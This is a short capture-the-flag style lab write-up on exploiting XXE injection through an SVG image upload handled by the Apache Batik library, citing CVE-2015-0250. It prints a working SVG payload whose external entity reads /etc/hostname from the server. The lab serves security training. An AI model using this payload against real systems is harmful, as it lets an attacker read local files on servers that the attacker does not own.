<div align='center'>

# **XXE Injection**

</div>

## **Lab:** Exploiting XXE via image file upload

**Goal:** Displays the contents of the /etc/hostname

**The lab provide:** The server uses Apache Batik library to process avatar image files.

1.  In the comment section, the website has the feature of uploading image file. We upload this [sample.svg](./Payload/sample.svg), the server accepts it. The server allow us to upload a .svg file which lead to potential XXE attack

![](./img/1.png)

2.  Since the server uses Apache Batik library, We find this vulnerbility [CVE-2015-0250](https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/) relating to XXE. We apply this payload for our case

```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]> 
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
Upload this file as [exploit.svg](./Payload/exploit.svg)